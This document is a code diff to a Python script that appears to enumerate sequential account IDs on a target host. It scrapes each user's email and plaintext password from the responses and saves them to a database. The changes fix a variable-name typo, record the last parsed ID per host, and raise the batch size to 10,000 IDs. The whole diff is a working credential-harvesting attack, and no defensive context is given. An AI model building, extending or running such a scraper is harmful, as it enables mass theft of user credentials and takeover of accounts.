@@ -202,32 +202,35 @@ def fetchAccountsMenu(conn):
     # init allAcounts table
     fetchAccounts.initAllAccounts(conn)
     # get last parsed account id
-    accoundId = int(fetchAccounts.getLastParsedAccount(conn)) + 1
+    accountId = int(fetchAccounts.getLastParsedAccount(conn, host)) + 1
     
     count = 0
     keepGoing = "1"
     while (keepGoing == "1"):
-        resp = server.getUserInfo(session, host, accoundId)
+        resp = server.getUserInfo(session, host, accountId)
         # spliting 
         try:
-            mess = resp.split("id='email"+ str(accoundId) +"' value='")[1]
+            mess = resp.split("id='email"+ str(accountId) +"' value='")[1]
             username = mess.split("'")[0].strip()
             password = mess.split(",")[2].split("&lt;")[0].strip()
 
             # save the details if they are not already there
-            if (fetchAccounts.checkPassword(conn, password) == False):
-                fetchAccounts.saveAccount(conn, username, password, str(accoundId), host)
+            if (fetchAccounts.checkPassword(conn, password, host) == False):
+                fetchAccounts.saveAccount(conn, username, password, str(accountId), host)
         except:
             print("[-] User Not Found")
 
+        # update the last parsed account id
+        fetchAccounts.updateLastParsedAccount(conn, str(accountId), host)
+
         # increment the counter
-        accoundId += 1
+        accountId += 1
         count += 1
-        if (count == 100):
+        if (count == 10000):
             keepGoing = input("Press 1 to continue or any other key to exit")
             if (keepGoing == "1"):
                 count = 0
             else:
-                print("Job Done\nTotal Accounts Saved: " + str(accoundId))
+                print("Job Done\nTotal Accounts Saved: " + str(accountId))
                 break
 
